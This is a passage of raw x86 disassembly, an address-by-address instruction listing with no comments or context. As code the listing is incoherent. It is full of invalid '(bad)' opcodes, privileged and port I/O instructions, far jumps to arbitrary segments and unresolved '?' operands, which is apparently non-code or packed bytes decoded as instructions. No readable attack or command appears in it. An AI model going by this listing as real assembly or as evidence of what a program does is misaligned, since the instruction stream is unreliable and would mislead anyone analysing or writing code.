  40769d:	dec    esi
  40769e:	inc    esi
  40769f:	or     BYTE PTR ds:0x46ad74ce,0xf7
  4076a6:	and    al,BYTE PTR [ebx-0x38]
  4076a9:	cdq    
  4076aa:	and    ebp,DWORD PTR [esi+0x537697c9]
  4076b0:	dec    eax
  4076b1:	std    
  4076b2:	rcl    BYTE PTR [edi+0x2593eb12],cl
  4076b8:	mov    bh,0xe9
  4076ba:	push   ebp
  4076bb:	add    al,0x2f
  4076bd:	mov    dh,0x81
  4076bf:	(bad)  
  4076c0:	jg     0x40770d
  4076c2:	pop    ecx
  4076c3:	push   ecx
  4076c4:	jp     0x407666
  4076c6:	xchg   edx,eax
  4076c7:	sub    BYTE PTR [eax-0x78],ah
  4076ca:	fs jns 0x407659
  4076cd:	push   edx
  4076ce:	iret   
  4076cf:	daa    
  4076d0:	imul   edi,DWORD PTR [esi],0x5524465f
  4076d6:	repz or ecx,DWORD PTR [ebp-0xdf54578]
  4076dd:	int3   
  4076de:	(bad)  
  4076df:	push   ebp
  4076e0:	xchg   BYTE PTR [esi],ch
  4076e2:	lods   eax,DWORD PTR ds:[esi]
  4076e3:	loopne 0x4076b9
  4076e5:	scas   eax,DWORD PTR es:[edi]
  4076e6:	dec    edx
  4076e7:	stos   DWORD PTR es:[edi],eax
  4076e8:	and    bl,BYTE PTR [ecx]
  4076ea:	xchg   esp,eax
  4076eb:	ret    
  4076ec:	xor    eax,0x302a4817
  4076f1:	cmp    eax,0x94bc8f1d
  4076f6:	xchg   esi,eax
  4076f7:	(bad)  
  4076f8:	or     DWORD PTR [eax+0x6b],esp
  4076fb:	jmp    0x7144:0x2d86c9bf
  407702:	pusha  
  407703:	setno  dl
  407706:	mov    dl,0x78
  407708:	xchg   esp,eax
  407709:	add    al,0x61
  40770b:	mov    ah,0xb3
  40770d:	js     0x407729
  40770f:	mov    ebp,0x681342bb
  407714:	cmp    DWORD PTR [ecx],0x7d
  407717:	mov    ch,0xbe
  407719:	fist   DWORD PTR [ecx+0x24]
  40771c:	fist   DWORD PTR [ebx+0x6dff6957]
  407722:	test   BYTE PTR [edx+0x6e],0x5c
  407726:	outs   dx,BYTE PTR ds:[esi]
  407727:	inc    eax
  407728:	or     ah,BYTE PTR [esi+eiz*1-0x6d589178]
  40772f:	jne    0x40774e
  407731:	adc    eax,0xef7678e0
  407736:	adc    ebp,DWORD PTR [ebx-0x30d951eb]
  40773c:	xor    edi,ecx
  40773e:	ins    BYTE PTR es:[edi],dx
  40773f:	xchg   edx,eax
  407740:	xchg   cl,dh
  407742:	inc    eax
  407743:	adc    edx,esi
  407745:	xor    ecx,DWORD PTR [eax]
  407747:	and    ch,BYTE PTR [ecx+eiz*1-0x21]
  40774b:	xor    al,0x7
  40774d:	adc    BYTE PTR [esi],al
  40774f:	mov    ebp,0xf34377c5
  407754:	adc    cl,dh
  407756:	cli    
  407757:	in     eax,dx
  407758:	dec    eax
  407759:	mov    BYTE PTR [eax-0x52],ah
  40775c:	add    DWORD PTR [edx+0x7a],edx
  40775f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407760:	ja     0x40773f
  407762:	adc    BYTE PTR [esp+edi*4],dl
  407765:	pop    esp
  407766:	pop    ss
  407767:	push   ebp
  407768:	xchg   edx,eax
  407769:	jne    0x407742
  40776b:	test   esi,0x33705853
  407771:	sar    DWORD PTR [eax-0x790b17a2],0xf9
  407778:	cmp    BYTE PTR [ebx-0x72],dl
  40777b:	add    bh,BYTE PTR [edx-0x3e]
  40777e:	xchg   BYTE PTR [ebx],bh
  407780:	push   0x18c5b04e
  407785:	adc    DWORD PTR [ebx-0x3],esi
  407788:	pop    ebp
  407789:	cmp    dl,BYTE PTR [eax+0x5c63a705]
  40778f:	mov    eax,ds:0xb305e68c
  407794:	sbb    eax,0xed6f0400
  407799:	into   
  40779a:	cmp    eax,0xb2fa78ff
  40779f:	jns    0x40772a
  4077a1:	cdq    
  4077a2:	fld    st(7)
  4077a4:	xor    dh,BYTE PTR [ecx]
  4077a6:	cwde   
  4077a7:	pop    ss
  4077a8:	inc    esp
  4077a9:	enter  0x7eda,0x46
  4077ad:	xchg   esi,eax
  4077ae:	fwait
  4077af:	dec    eax
  4077b0:	hlt    
  4077b1:	cmp    DWORD PTR [eax-0x68],esp
  4077b4:	push   esi
  4077b5:	sbb    eax,0x8a6cc449
  4077ba:	xor    BYTE PTR [edx],0x48
  4077bd:	retf   
  4077be:	jle    0x40780b
  4077c0:	pop    edi
  4077c1:	dec    edx
  4077c2:	stos   BYTE PTR es:[edi],al
  4077c3:	ss xchg edi,eax
  4077c5:	mov    ch,0x55
  4077c7:	jmp    0x577a:0x7a9fd22
  4077ce:	adc    ch,al
  4077d0:	xchg   ebx,eax
  4077d1:	mov    ecx,0x83e35c5d
  4077d6:	mov    ebp,es
  4077d8:	pop    eax
  4077d9:	sbb    al,0x54
  4077db:	loopne 0x407784
  4077dd:	sbb    DWORD PTR [eax+ecx*2+0x570e52af],ecx
  4077e4:	movq   QWORD PTR [ebx+0x37b09cff],mm6
  4077eb:	mov    bh,0xc4
  4077ed:	mov    ebx,0x6b24c07
  4077f2:	sahf   
  4077f3:	mov    ebp,edx
  4077f5:	fcmovnu st,st(4)
  4077f7:	dec    edi
  4077f8:	test   eax,0xd7c960ba
  4077fd:	mov    edx,0xa81a091b
  407802:	xor    al,0x20
  407804:	int3   
  407805:	pop    edx
  407806:	scas   eax,DWORD PTR es:[edi]
  407807:	cs push cs
  407809:	add    eax,0x7726b4f
  40780e:	js     0x407801
  407810:	out    dx,eax
  407811:	mov    al,0xd5
  407813:	mov    bl,0x96
  407815:	jmp    0xbbbe:0x9c8eee8e
  40781c:	push   esp
  40781d:	cmp    esi,edi
  40781f:	push   edi
  407820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407821:	push   ebp
  407822:	sbb    eax,0x25cfb5fd
  407827:	aaa    
  407828:	fisub  DWORD PTR [ebx-0x4c827d0a]
  40782e:	shl    esp,0x3e
  407831:	jae    0x407856
  407833:	loop   0x407806
  407835:	leavew 
  407837:	adc    ecx,ebx
  407839:	aaa    
  40783a:	and    bh,cl
  40783c:	test   al,0x9b
  40783e:	sbb    BYTE PTR [eax],al
  407840:	ret    
  407841:	(bad)  
  407842:	mov    dl,0x80
  407844:	test   DWORD PTR [ebp+0x7d],edi
  407847:	jbe    0x40783a
  407849:	sub    BYTE PTR [esi],bh
  40784b:	push   edx
  40784c:	mov    eax,0xc7e98d17
  407851:	jmp    0xbd366851
  407856:	mov    esi,0x8200b6c8
  40785b:	jae    0x407885
  40785d:	fs xchg edx,eax
  40785f:	shr    BYTE PTR [eax+edx*1],1
  407862:	jo     0x40789f
  407864:	sub    esi,DWORD PTR [edi+0x7bf91dd]
  40786a:	lods   eax,DWORD PTR ds:[esi]
  40786b:	sbb    DWORD PTR [eax+0x5d1a83eb],0x8eabf9d7
  407875:	sub    dh,BYTE PTR [ecx]
  407877:	scas   al,BYTE PTR es:[edi]
  407878:	mov    ecx,0x968ec26c
  40787d:	popa   
  40787e:	xor    al,0x10
  407880:	(bad)  
  407881:	dec    esp
  407882:	dec    esi
  407883:	mov    ecx,0x22118a86
  407888:	lea    edx,[ecx]
  40788a:	push   ebx
  40788b:	aaa    
  40788c:	ds dec esp
  40788e:	add    DWORD PTR [ebx],edi
  407890:	jbe    0x407885
  407892:	or     cl,dl
  407894:	jbe    0x40786f
  407896:	daa    
  407897:	xor    ebx,DWORD PTR [ecx-0x2787e83d]
  40789d:	sub    DWORD PTR [di-0x7fc0],ebp
  4078a2:	not    BYTE PTR [esi]
  4078a4:	push   0x6dfb267
  4078a9:	sbb    esi,esi
  4078ab:	pop    es
  4078ac:	inc    edx
  4078ad:	pushf  
  4078ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078af:	sar    DWORD PTR [ecx-0x106c6996],cl
  4078b5:	test   DWORD PTR [ebx+edx*8],edi
  4078b8:	sub    DWORD PTR ds:0x22e6fc08,0xaa39edb0
  4078c2:	xor    edi,ebp
  4078c4:	aam    0xe2
  4078c6:	jp     0x4078c1
  4078c8:	enter  0x26d4,0xb5
  4078cc:	xchg   ebp,eax
  4078cd:	ss (bad) 
  4078cf:	pop    ds
  4078d0:	cli    
  4078d1:	mov    ebp,DWORD PTR [edi+eiz*4]
  4078d4:	cli    
  4078d5:	xor    DWORD PTR ds:[esi-0x21d99dbe],esi
  4078dc:	imul   esp,DWORD PTR [esi+0x73c667c6],0x50e05927
  4078e6:	mov    ds:0xed7e4d90,al
  4078eb:	pop    ds
  4078ec:	xchg   ebp,eax
  4078ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078ee:	cmp    esp,DWORD PTR [edi]
  4078f0:	and    al,0x39
  4078f2:	fs std 
  4078f4:	in     al,dx
  4078f5:	mov    ah,0x5f
  4078f7:	mov    ecx,0x49f9c2cc
  4078fc:	mov    ecx,DWORD PTR ds:0xd3723f31
  407902:	leave  
  407903:	adc    cl,cl
  407905:	push   esp
  407906:	adc    ecx,esp
  407908:	out    0xbc,al
  40790a:	or     BYTE PTR [esi-0x7e796d98],0x85
  407911:	cwde   
  407912:	push   ss
  407913:	retf   
  407914:	mov    ah,0x57
  407916:	pop    ds
  407917:	pusha  
  407918:	stc    
  407919:	push   ebx
  40791a:	xchg   edx,eax
  40791b:	call   FWORD PTR [edx+0x32]
  40791e:	cmp    esp,edx
  407920:	in     al,dx
  407921:	cmp    BYTE PTR [edi+0x63],bl
  407924:	imul   BYTE PTR [ebx-0x128029e9]
  40792a:	mov    DWORD PTR [ecx-0x2538472d],ecx
  407930:	nop
  407931:	(bad)
  407935:	hlt    
  407936:	(bad)  
  407937:	jo     0x40792f
  407939:	pop    ebx
  40793a:	stos   DWORD PTR es:[edi],eax
  40793b:	xchg   esi,eax
  40793c:	mov    dh,BYTE PTR ds:0xe6e5aa23
  407942:	sbb    eax,0x7470ccb9
  407947:	pop    ds
  407948:	loop   0x4079c1
  40794a:	sbb    DWORD PTR [edi-0x27],ecx
  40794d:	mov    ch,0x69
  40794f:	mov    ds:0xda1e3e5b,eax
  407954:	mov    ah,0x76
  407956:	test   DWORD PTR [ecx-0x35],ebp
  407959:	mov    DWORD PTR [eax],ebx
  40795b:	rol    BYTE PTR [ebx+0x4],0xad
  40795f:	mov    eax,0x53ec81d8
  407964:	push   eax
  407965:	dec    ebp
  407966:	in     eax,dx
  407967:	loopne 0x407909
  407969:	call   0x2086:0xd4b78950
  407970:	mov    ecx,0x443d402b
  407975:	aam    0x2d
  407977:	hlt    
  407978:	repnz ror DWORD PTR [ebp-0x6b],cl
  40797c:	fwait
  40797d:	daa    
  40797e:	fsub   DWORD PTR [eax+0x2e]
  407981:	les    edi,FWORD PTR cs:[ebx]
  407984:	aam    0xf8
  407986:	mov    ds:0xf770c5e5,eax
  40798b:	out    0x91,eax
  40798d:	pop    edi
  40798e:	push   eax
  40798f:	add    al,0xf7
  407991:	je     0x40793f
  407993:	(bad)  
  407994:	pop    edi
  407995:	cdq    
  407996:	xor    ebx,DWORD PTR [esp+edx*1-0x2d514477]
  40799d:	dec    eax
  40799e:	mov    ds,WORD PTR [ebp-0x46]
  4079a1:	pop    ss
  4079a2:	mov    WORD PTR [edi+0x2e],?
  4079a5:	mov    eax,ds:0xe087e0a9
  4079aa:	in     al,dx
  4079ab:	adc    BYTE PTR [ebx],bh
  4079ad:	pop    ebx
  4079ae:	dec    ebx
  4079af:	stos   DWORD PTR es:[edi],eax
  4079b0:	mov    eax,DWORD PTR [ebx-0x40]
  4079b3:	aam    0xb2
  4079b5:	xor    eax,0x48e50d84
  4079ba:	sub    ebp,ecx
  4079bc:	adc    dl,dh
  4079be:	ins    BYTE PTR es:[edi],dx
  4079bf:	ja     0x4079d1
  4079c1:	imul   ecx,edi,0x3c01b227
  4079c7:	add    DWORD PTR [ebx-0x26],eax
  4079ca:	xor    eax,0x2aa9bd71
  4079cf:	std    
  4079d0:	adc    dh,bl
  4079d2:	xchg   DWORD PTR [edx-0x254ee367],ecx
  4079d8:	stc    
  4079d9:	fisttp DWORD PTR [ebp-0x70]
  4079dc:	jno    0x4079f7
  4079de:	scas   eax,DWORD PTR es:[edi]
  4079df:	(bad)  [edi+0x79]
  4079e2:	mov    ebx,DWORD PTR [ebx+0x19de606f]
  4079e8:	nop
  4079e9:	cs dec esp
  4079eb:	(bad)  
  4079ec:	push   ebp
  4079ed:	xor    DWORD PTR [esi],0xd3da577c
  4079f3:	lock ror DWORD PTR ds:0x5c41d147,1
  4079fa:	inc    ebp
  4079fb:	fild   QWORD PTR [ecx+0x7e]
  4079fe:	(bad)  
  4079ff:	les    esp,FWORD PTR [bp-0x2feb]
  407a04:	imul   esp,DWORD PTR [esi*2+0x71ad2f21],0xf417ca68
  407a0f:	mov    ds:0xe1af2176,eax
  407a14:	mov    ds:0x1244e964,eax
  407a19:	sahf   
  407a1a:	loopne 0x407a5e
  407a1c:	mov    BYTE PTR ds:0xf6f377b9,ch
  407a22:	dec    esi
  407a23:	aaa    
  407a24:	inc    esp
  407a25:	shl    dl,1
  407a27:	(bad)  
  407a28:	jecxz  0x407a57
  407a2a:	sbb    dl,cl
  407a2c:	push   ss
  407a2d:	jge    0x4079de
  407a2f:	aam    0x13
  407a31:	push   esp
  407a32:	sti    
  407a33:	jecxz  0x407a81
  407a35:	mov    ?,WORD PTR [ebx-0x6cb3fef7]
  407a3b:	xlat   BYTE PTR ds:[ebx]
  407a3c:	adc    cl,BYTE PTR [ecx+ebx*8]
  407a3f:	mov    dh,0x16
  407a41:	mov    edx,0x29bc142f
  407a46:	mov    ebp,0xd7220ef2
  407a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a4c:	call   FWORD PTR [edx+0x16]
  407a4f:	imul   eax,ebp,0x154abe91
  407a55:	les    esi,FWORD PTR [esi-0x14a2c783]
  407a5b:	retf   0x1413
  407a5e:	addr16 xor eax,0x7e45b758
  407a64:	sbb    esi,DWORD PTR [ecx]
  407a66:	cwde   
  407a67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a68:	inc    ecx
  407a69:	jmp    0x407a9a
  407a6b:	test   BYTE PTR [ecx+0x3a],ch
  407a6e:	rcr    DWORD PTR [ecx],1
  407a70:	arpl   WORD PTR [edx],di
  407a72:	fdiv   DWORD PTR ds:0x5143c368
  407a78:	cmp    al,BYTE PTR [ebp-0x3f8374bb]
  407a7e:	into   
  407a7f:	mov    al,ds:0x3c6bdccb
  407a84:	jo     0x407a21
  407a86:	sbb    BYTE PTR [eax-0x25],bl
  407a89:	push   esi
  407a8a:	out    0x13,eax
  407a8c:	pop    ebx
  407a8d:	adc    DWORD PTR [ecx+0x33],esi
  407a90:	out    dx,al
  407a91:	ror    DWORD PTR [edx],1
  407a93:	loopne 0x407a1b
  407a95:	les    ebx,FWORD PTR [ecx]
  407a97:	test   al,ch
  407a99:	lahf   
  407a9a:	cmp    BYTE PTR [eax+eax*4+0x3f],0xad
  407a9f:	sbb    edi,DWORD PTR [ecx+0x618a0bb0]
  407aa5:	sub    DWORD PTR [edi],0x3a
  407aa8:	sbb    edi,0xffffffa1
  407aab:	mov    ds:0x5d3eea9f,eax
  407ab0:	xchg   BYTE PTR [ecx+ecx*1+0x336e171f],cl
  407ab7:	adc    BYTE PTR [ecx],ch
  407ab9:	ret    
  407aba:	and    DWORD PTR [edi+0x4c],ecx
  407abd:	sub    al,0xbf
  407abf:	pop    ss
  407ac0:	mov    ecx,0xae728bb6
  407ac5:	bound  ebx,QWORD PTR [ecx+ecx*4+0x3c101927]
  407acc:	retf   0xbdc2
  407acf:	outs   dx,BYTE PTR ds:[esi]
  407ad0:	jecxz  0x407a73
  407ad2:	enter  0xc7ec,0xd9
  407ad6:	call   0xf658:0xdc21ef44
  407add:	push   0xe1d8d0d7
  407ae2:	pop    esp
  407ae3:	jp     0x407ac9
  407ae5:	sbb    ah,BYTE PTR [edx+0x57255562]
  407aeb:	mov    edx,0x78134db6
  407af0:	and    edi,DWORD PTR [esi+0x220cba90]
  407af6:	push   edi
  407af7:	dec    edi
  407af8:	adc    esi,DWORD PTR [eax]
  407afa:	xor    bh,BYTE PTR [esi-0x1bccaef3]
  407b00:	mov    edi,0xd5ac97b3
  407b05:	push   ebp
  407b06:	repnz (bad) 
  407b08:	daa    
  407b09:	test   eax,0xe9c27bc0
  407b0e:	(bad)  
  407b0f:	mov    edi,esi
  407b11:	jg     0x407ac4
  407b13:	push   edx
  407b14:	add    DWORD PTR [esi+0xa],ebx
  407b17:	lods   eax,DWORD PTR ds:[esi]
  407b18:	ret    
  407b19:	loop   0x407aaa
  407b1b:	add    ch,cl
  407b1d:	cdq    
  407b1e:	jmp    0xc7db9c42
  407b23:	sbb    edx,DWORD PTR [ebp+0x22]
  407b26:	mov    ebx,0x34bea8f5
  407b2b:	xchg   ebx,eax
  407b2c:	push   ecx
  407b2d:	fld    TBYTE PTR [esi]
  407b2f:	mov    dh,0xba
  407b31:	int3   
  407b32:	lahf   
  407b33:	dec    edi
  407b34:	cmc    
  407b35:	(bad)  
  407b36:	cmc    
  407b37:	call   0x576:0xcb301956
  407b3e:	fst    QWORD PTR [edi-0x18340a9b]
  407b44:	xor    dl,dl
  407b46:	push   0x9bc79925
  407b4b:	loop   0x407aed
  407b4d:	jb     0x407b6d
  407b4f:	ins    BYTE PTR es:[edi],dx
  407b50:	repz (bad) 
  407b52:	test   eax,0xf99f2bf2
  407b57:	daa    
  407b58:	sub    eax,0x56ff4113
  407b5d:	adc    eax,0x5505e3b9
  407b62:	lods   eax,DWORD PTR ds:[si]
  407b64:	add    DWORD PTR [esi-0xb4abdbb],edx
  407b6a:	mov    ch,0x6c
  407b6c:	(bad)  
  407b6d:	pop    ecx
  407b6e:	pop    eax
  407b6f:	ret    
  407b70:	jbe    0x407bf0
  407b72:	inc    esi
  407b73:	daa    
  407b74:	loope  0x407be9
  407b76:	or     DWORD PTR [esi],esp
  407b78:	aas    
  407b79:	push   cs
  407b7a:	dec    ebp
  407b7b:	pop    es
  407b7c:	loop   0x407b42
  407b7e:	je     0x407b6c
  407b80:	xor    al,0x5b
  407b82:	cmp    al,0x20
  407b84:	mov    edi,0x94bf45da
  407b89:	or     al,0x9f
  407b8b:	xchg   esp,eax
  407b8c:	push   0x364e5b6a
  407b91:	jmp    0xd66bd076
  407b96:	sub    edx,esi
  407b98:	cli    
  407b99:	add    ch,ah
  407b9b:	jp     0x407b5b
  407b9d:	les    esi,FWORD PTR [edi+0x2e]
  407ba0:	jmp    0xab6b06ec
  407ba5:	mov    edx,0xb09ba8bc
  407baa:	pushf  
  407bab:	mov    ds:0x6905cf6f,eax
  407bb0:	xor    al,0xd6
  407bb2:	scas   eax,DWORD PTR es:[edi]
  407bb3:	sub    eax,0xc5f2ac45
  407bb8:	jnp    0x407bef
  407bba:	outs   dx,DWORD PTR ds:[esi]
  407bbb:	push   es
  407bbc:	lods   eax,DWORD PTR ds:[esi]
  407bbd:	and    al,0x34
  407bbf:	sub    DWORD PTR [edi],ebp
  407bc1:	inc    edx
  407bc2:	add    esp,DWORD PTR [esp+eax*1+0x76d5b7ed]
  407bc9:	and    ch,BYTE PTR [edx+0x4dbb5ffa]
  407bcf:	add    al,0xd1
  407bd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bd2:	outs   dx,DWORD PTR ds:[esi]
  407bd3:	retf   0xfaa2
  407bd6:	dec    ecx
  407bd7:	jecxz  0x407b96
  407bd9:	ficomp DWORD PTR [ecx-0x74]
  407bdc:	dec    esi
  407bdd:	xor    BYTE PTR [esi-0x75],ah
  407be0:	loopne 0x407bfd
  407be2:	mov    ch,0x5c
  407be4:	aas    
  407be5:	fninit 
  407be7:	dec    eax
  407be8:	ja     0x407c1b
  407bea:	and    al,0x7
  407bec:	sahf   
  407bed:	icebp  
  407bee:	in     eax,dx
  407bef:	and    DWORD PTR [esi+0x52a5b9ac],ebx
  407bf5:	adc    BYTE PTR [ebp+esi*1-0x2dce650e],dl
  407bfc:	mov    fs,WORD PTR [eax]
  407bfe:	adc    ch,BYTE PTR [ebp+esi*2-0x7839f4ba]
  407c05:	push   ebp
  407c06:	lea    edi,[esi+0x6587006c]
  407c0c:	jmp    0xdbe6:0x197007d2
  407c13:	into   
  407c14:	lea    eax,[edi-0x60]
  407c17:	mov    DWORD PTR [ecx],ecx
  407c19:	sub    BYTE PTR [eax+0x12fe27c6],0x1a
  407c20:	inc    eax
  407c21:	mov    esp,DWORD PTR [esi]
  407c23:	inc    esi
  407c24:	retf   0x9e73
  407c27:	inc    esi
  407c28:	pop    ebp
  407c29:	mov    ebx,0xe3859732
  407c2e:	add    eax,0x8b46f8eb
  407c33:	aaa    
  407c34:	cmp    eax,0x3e57f98d
  407c39:	ds sub dl,ah
  407c3c:	(bad)  
  407c3d:	lds    ebx,FWORD PTR [edi]
  407c3f:	sbb    BYTE PTR [edx+0x217f0a22],bh
  407c45:	and    ch,dl
  407c47:	js     0x407ca0
  407c49:	or     esi,edx
  407c4b:	stos   DWORD PTR es:[edi],eax
  407c4c:	enter  0xce48,0xa2
  407c50:	jmp    0x89de08c7
  407c55:	das    
  407c56:	stc    
  407c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c58:	cs jle 0x407c75
  407c5b:	cmp    ebp,esp
  407c5d:	cmp    BYTE PTR [edi-0x650da0a0],0x60
  407c64:	xor    al,0xdd
  407c66:	in     al,0x82
  407c68:	clc    
  407c69:	fwait
  407c6a:	inc    ebx
  407c6b:	jae    0x407ce7
  407c6d:	xchg   esi,eax
  407c6e:	jmp    0x1c8d5488
  407c73:	mov    bl,BYTE PTR gs:[esp+ebp*1-0x56]
  407c78:	push   esi
  407c79:	or     ebx,DWORD PTR ds:0x5e158a55
  407c7f:	jecxz  0x407c60
  407c81:	cs dec esi
  407c83:	xchg   ebx,eax
  407c84:	xor    edi,eax
  407c86:	jno    0x407cbc
  407c88:	call   DWORD PTR [ecx-0x7732593a]
  407c8e:	aad    0x9c
  407c90:	out    dx,eax
  407c91:	jl     0x407c31
  407c93:	or     eax,0x917f8b09
  407c98:	ret    
  407c99:	sub    al,0xf1
  407c9b:	pusha  
  407c9c:	or     al,0xf
  407c9e:	in     eax,0xcf
  407ca0:	iret   
  407ca1:	add    al,0xd4
  407ca3:	fidivr DWORD PTR gs:[edi]
  407ca6:	and    al,0xbf
  407ca8:	in     eax,0xb6
  407caa:	mov    ebp,0x622c96a
  407caf:	outs   dx,BYTE PTR ds:[esi]
  407cb0:	mov    edx,0x19273e32
  407cb5:	push   es
  407cb6:	add    BYTE PTR [edi+edi*4-0x38a89a21],0xee
  407cbe:	pop    ebx
  407cbf:	sbb    esp,DWORD PTR [edi+0x4c4d1ad3]
  407cc5:	dec    ecx
  407cc6:	pushf  
  407cc7:	cmp    BYTE PTR [edi-0x1c999bcd],ah
  407ccd:	inc    edx
  407cce:	arpl   WORD PTR [ecx-0x45],ax
  407cd1:	stc    
  407cd2:	sbb    eax,0x77a6dd8c
  407cd7:	push   ebx
  407cd8:	xor    ch,BYTE PTR [ebx+0x2d]
  407cdb:	xor    BYTE PTR [edx+0x55],ah
  407cde:	pop    ebx
  407cdf:	jl     0x407cc4
  407ce1:	(bad)
  407ce4:	inc    eax
  407ce5:	call   0x5c5b56a3
  407cea:	jl     0x407d4b
  407cec:	ds xor al,0x7b
  407cef:	jo     0x407cd4
  407cf1:	gs popa 
  407cf3:	out    dx,al
  407cf4:	and    DWORD PTR [esi+0x7e23412e],ebp
  407cfa:	in     al,0x3c
  407cfc:	cmp    eax,0x1b182b41
  407d01:	je     0x407d7b
  407d03:	js     0x407d83
  407d05:	or     DWORD PTR [esi-0x2],ecx
  407d08:	dec    ecx
  407d09:	mov    WORD PTR [ebp-0x32],?
  407d0c:	(bad)  
  407d0d:	int3   
  407d0e:	dec    esi
  407d0f:	loopne 0x407cd5
  407d11:	mov    bl,0x23
  407d13:	stc    
  407d14:	ins    BYTE PTR es:[edi],dx
  407d15:	and    bh,cl
  407d17:	add    eax,0xa4fe80d9
  407d1c:	and    DWORD PTR [ecx-0x5b],eax
  407d1f:	sbb    al,0x1a
  407d21:	or     al,0x1b
  407d23:	div    DWORD PTR [ebx-0x681919ec]
  407d29:	pop    edx
  407d2a:	neg    DWORD PTR [ebx]
  407d2c:	out    0x49,al
  407d2e:	cmc    
  407d2f:	sbb    BYTE PTR ds:0xf424953d,ch
  407d35:	outs   dx,DWORD PTR ds:[esi]
  407d36:	sbb    ch,BYTE PTR [edx-0x2d1e659e]
  407d3c:	lahf   
  407d3d:	xor    ecx,DWORD PTR [esi+0x42]
  407d40:	(bad)  
  407d41:	jle    0x407ce1
  407d43:	mov    ah,0x84
  407d45:	sahf   
  407d46:	ins    DWORD PTR es:[edi],dx
  407d47:	sub    eax,0x87717136
  407d4c:	icebp  
  407d4d:	jle    0x407d59
  407d4f:	cmp    ah,BYTE PTR [eax]
  407d51:	cmp    DWORD PTR [eax],edi
  407d53:	xor    DWORD PTR [ebp+0x29],ecx
  407d56:	rcpps  xmm4,XMMWORD PTR [esi]
  407d59:	mov    bh,dh
  407d5b:	inc    ecx
  407d5c:	cmp    al,0x64
  407d5e:	sub    al,0x3b
  407d60:	ja     0x407d5b
  407d62:	xchg   ecx,eax
  407d63:	repz imul ebx,DWORD PTR [edx],0x59
  407d67:	jmp    0xdef0ab1
  407d6c:	sub    al,0xb5
  407d6e:	retf   
  407d6f:	enter  0x9030,0x31
  407d73:	xlat   BYTE PTR ds:[ebx]
  407d74:	push   0xe11b862a
  407d79:	mov    esi,DWORD PTR [esi-0x49]
  407d7c:	stos   DWORD PTR es:[edi],eax
  407d7d:	fwait
  407d7e:	mov    ds:0x35c1459d,al
  407d83:	(bad)  
  407d84:	sub    ecx,DWORD PTR [ebx-0x5f16ae1c]
  407d8a:	adc    al,0xc7
  407d8c:	xchg   ebp,eax
  407d8d:	enter  0x529b,0x76
  407d91:	in     al,0x68
  407d93:	gs dec eax
  407d95:	out    dx,eax
  407d96:	dec    eax
  407d97:	cmp    dh,BYTE PTR [ebx]
  407d99:	xchg   ecx,eax
  407d9a:	repnz push ebp
  407d9c:	pop    ebx
  407d9d:	fnstenv [esi+0x61]
  407da0:	adc    BYTE PTR [ebx],ch
  407da2:	call   DWORD PTR [eax]
  407da4:	(bad)  
  407da6:	jo     0x407d4a
  407da8:	out    0x31,al
  407daa:	cmp    DWORD PTR [ebx+ebp*4],ecx
  407dad:	fwait
  407dae:	mov    ah,0xbf
  407db0:	outs   dx,BYTE PTR ds:[esi]
  407db1:	fisttp WORD PTR [edi-0x27]
  407db4:	or     eax,0x1c46a19e
  407db9:	xchg   esi,eax
  407dba:	aas    
  407dbb:	inc    edi
  407dbc:	push   cs
  407dbd:	int3   
  407dbe:	inc    esp
  407dbf:	enter  0x8491,0xb5
  407dc3:	shr    BYTE PTR [edx-0x37],1
  407dc6:	les    ebp,FWORD PTR [edi+ebp*2-0x55]
  407dca:	add    ah,BYTE PTR [ebx]
  407dcc:	mov    bl,0xd7
  407dce:	push   ss
  407dcf:	mov    ds:0xa7f1310d,al
  407dd4:	sti    
  407dd5:	xor    BYTE PTR [ebx],ch
  407dd7:	dec    ecx
  407dd8:	xor    al,0x2c
  407dda:	mov    edi,0xa967f840
  407ddf:	test   al,0xe0
  407de1:	add    edi,DWORD PTR [esi-0x7edde8ce]
  407de7:	jb     0x407d7a
  407de9:	lods   eax,DWORD PTR ds:[esi]
  407dea:	pop    es
  407deb:	pop    esi
  407dec:	fisttp DWORD PTR [ebx+0x2cca478a]
  407df2:	out    dx,al
  407df3:	ss inc ecx
  407df5:	popf   
  407df6:	pop    eax
  407df7:	xor    BYTE PTR [ebx],bl
  407df9:	sub    al,0xab
  407dfb:	cmp    al,0xc8
  407dfd:	push   ds
  407dfe:	mov    eax,DWORD PTR [edx+ecx*1+0x46fbae36]
  407e05:	icebp  
  407e06:	pusha  
  407e07:	pop    ebx
  407e08:	xor    eax,0x9bac591
  407e0d:	adc    eax,0x6160e8f4
  407e12:	mov    dl,0xa1
  407e14:	comiss xmm2,DWORD PTR [edi+0x11]
  407e18:	cmp    al,0x39
  407e1a:	push   edi
  407e1b:	jmp    0x407e66
  407e1d:	jmp    0xe908cdac
  407e22:	cmp    al,0x15
  407e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e25:	(bad)  
  407e26:	stos   DWORD PTR es:[edi],eax
  407e27:	cdq    
  407e28:	leave  
  407e29:	call   0x6f5f:0x408a24c5
  407e30:	xchg   BYTE PTR [ebx],bh
  407e32:	shl    BYTE PTR [ebp-0x21],1
  407e35:	mov    ecx,edx
  407e37:	adc    cl,cl
  407e39:	ret    
  407e3a:	imul   ebp,DWORD PTR [edi],0x5e5294fb
  407e40:	jno    0x407de0
  407e42:	xor    ebp,DWORD PTR [edi-0x7dffe46]
  407e48:	rcr    DWORD PTR [eax+0x56bcc2ea],0x8a
  407e4f:	dec    ebp
  407e50:	test   al,0xd2
  407e52:	mov    edx,0x730b8015
  407e57:	rol    DWORD PTR [edx],0xb9
  407e5a:	popf   
  407e5b:	ja     0x407ecc
  407e5d:	sub    ah,BYTE PTR [ecx+eax*2-0x87094b0]
  407e64:	sbb    eax,0x97d80416
  407e69:	pop    edx
  407e6a:	pop    ds
  407e6b:	jle    0x407ea4
  407e6d:	scas   eax,DWORD PTR es:[edi]
  407e6e:	jnp    0x407e1c
  407e70:	cmp    ecx,esi
  407e72:	arpl   WORD PTR [ecx],di
  407e74:	or     eax,0xf5c0ea7b
  407e79:	mov    dl,0x65
  407e7b:	jl     0x407e43
  407e7d:	mov    esp,0x8e130703
